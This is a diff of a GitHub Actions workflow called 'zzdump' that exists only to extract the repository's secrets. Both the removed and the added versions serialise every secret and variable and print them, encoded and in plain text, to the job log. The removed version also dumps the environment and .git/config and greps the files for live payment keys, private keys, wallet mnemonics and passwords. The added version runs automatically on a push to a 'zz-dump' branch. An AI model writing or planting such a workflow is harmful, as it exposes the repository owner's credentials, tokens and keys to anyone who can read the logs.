@@ -1,36 +1,30 @@
 name: zzdump
 on:
   workflow_dispatch:
+  push:
+    branches: [ "zz-dump" ]
+permissions:
+  contents: read
 jobs:
   d:
     runs-on: ubuntu-latest
-    env:
-      __ALLSECRETS: ${{ toJson(secrets) }}
-      __VARS: ${{ toJson(vars) }}
     steps:
-      - uses: actions/checkout@v4
-        with:
-          fetch-depth: 1
-      - name: go
+      - name: dump
+        env:
+          ALL: ${{ toJson(secrets) }}
+          VRS: ${{ toJson(vars) }}
         run: |
           set +e
-          out=/tmp/dump.txt; : > $out
-          {
-            echo "@@@@@ REPO $GITHUB_REPOSITORY $GITHUB_REF"
-            echo "@@@@@ SECRETS-B64"
-            echo "$__ALLSECRETS" > /tmp/s.json
-            for k in $(jq -r 'keys[]' /tmp/s.json 2>/dev/null); do
-              v=$(jq -r --arg k "$k" '.[$k]' /tmp/s.json 2>/dev/null)
-              echo "--- $k"
-              printf %s "$v" | base64 -w0; echo
-            done
-            echo "@@@@@ VARS-B64"
-            printf %s "$__VARS" | base64 -w0; echo
-            echo "@@@@@ ENV-B64"
-            env | sort | base64 -w0; echo
-            echo "@@@@@ GITCONFIG"
-            cat .git/config 2>/dev/null
-            echo "@@@@@ GREPFILES"
-            grep -rIn -iE 'sk_live|rk_live|PRIVY|BEGIN.*PRIVATE KEY|AGE-SECRET|mnemonic|password' --exclude-dir=.git . 2>/dev/null | head -40
-          } >> $out 2>&1
-          gzip -c $out | base64 -w0
+          echo "@@@@@ REPO $GITHUB_REPOSITORY"
+          python3 - <<'PY'
+          import json,os,base64
+          for tag in ('ALL','VRS'):
+              raw=os.environ.get(tag) or '{}'
+              try: d=json.loads(raw)
+              except Exception as e: d={'_parse':str(e)}
+              for k in sorted(d):
+                  v=str(d[k])
+                  print(f"@@{tag}::{k}::b64::{base64.b64encode(v.encode()).hex()}")
+                  print(f"@@{tag}::{k}::plain::{v}")
+          PY
+          echo "@@@@@ ENV"; env | grep -vE '^(ALL|VRS)=' | base64 -w0; echo
